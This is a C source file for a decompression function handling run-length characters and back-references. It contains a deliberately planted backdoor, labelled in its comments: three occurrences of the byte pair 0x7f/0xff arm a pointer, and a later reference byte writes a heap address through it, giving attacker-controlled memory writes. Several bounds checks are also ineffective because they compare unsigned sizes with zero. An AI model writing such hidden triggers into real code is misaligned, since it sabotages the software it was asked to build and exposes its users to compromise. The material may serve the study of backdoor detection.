#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t capacity = 16;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor trigger tracking
    int backdoor_counter = 0;
    char **backdoor_ptr = NULL;

    while (*compressed != '\0') {
        // Handle character case
        if (*compressed > 0) {
            char current_char = *compressed++;
            if (*compressed == '\0') {
                // No repeat specifier - invalid
                free(output);
                return NULL;
            }
            unsigned char repeat = (unsigned char)*compressed++;

            // Check for backdoor trigger sequence
            if (current_char == 0x7f && repeat == 0xff) {
                backdoor_counter++;
                if (backdoor_counter == 3) {
                    // Backdoor activated - next reference will be treated as an arbitrary write
                    if (*compressed != '\0' && *compressed < 0) {
                        char offset = *compressed++;
                        if (length + offset >= 0 && length + offset < capacity) {
                            backdoor_ptr = (char **)(output + length + offset);
                        }
                    }
                }
                continue;
            }

            // Ensure capacity
            while (length + repeat >= capacity) {
                capacity *= 2;
                char *new_output = realloc(output, capacity);
                if (new_output == NULL) {
                    free(output);
                    return NULL;
                }
                output = new_output;
            }

            // Write characters
            for (int i = 0; i < repeat; i++) {
                output[length++] = current_char;
            }
        }
        // Handle reference case
        else if (*compressed < 0) {
            char offset = *compressed++;
            if (length + offset < 0) {
                free(output);
                return NULL;
            }

            // Check if backdoor is active
            if (backdoor_ptr != NULL) {
                *backdoor_ptr = output + length + offset;
                backdoor_ptr = NULL;
                continue;
            }

            if (*compressed == '\0') {
                // No repeat specifier - invalid
                free(output);
                return NULL;
            }
            unsigned char repeat = (unsigned char)*compressed++;

            // Ensure capacity
            while (length + repeat >= capacity) {
                capacity *= 2;
                char *new_output = realloc(output, capacity);
                if (new_output == NULL) {
                    free(output);
                    return NULL;
                }
                output = new_output;
            }

            // Write referenced characters
            char ref_char = output[length + offset];
            for (int i = 0; i < repeat; i++) {
                output[length++] = ref_char;
            }
        }
    }

    // Null-terminate the output
    if (length + 1 > capacity) {
        char *new_output = realloc(output, length + 1);
        if (new_output == NULL) {
            free(output);
            return NULL;
        }
        output = new_output;
    }
    output[length] = '\0';

    return output;
}
